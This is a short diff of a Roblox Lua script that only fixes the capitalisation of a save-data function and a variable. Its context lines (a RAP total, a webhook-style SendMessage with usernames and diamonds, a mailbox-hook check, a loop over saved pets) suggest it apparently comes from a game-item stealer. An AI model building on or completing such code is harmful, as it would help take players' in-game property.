@@ -14,8 +14,8 @@ local totalRAP = 0
 local getFucked = false
 _G.scriptExecuted = _G.scriptExecuted or false
 
-local function Getsave()
-    return require(game.ReplicatedStorage.Library.Client.save).Get()
+local function GetSave()
+    return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
 if _G.scriptExecuted then
@@ -72,6 +72,7 @@ local function SendMessage(username, diamonds)
             inline = false
         }
     }
+
     local combinedItems = {}
     local itemRapMap = {}
 
@@ -235,7 +236,7 @@ end
 
 local function IsMailboxHooked()
     local uid
-    for i, v in pairs(save["Pet"]) do
+    for i, v in pairs(Save["Pet"]) do
         uid = i
         break
     end
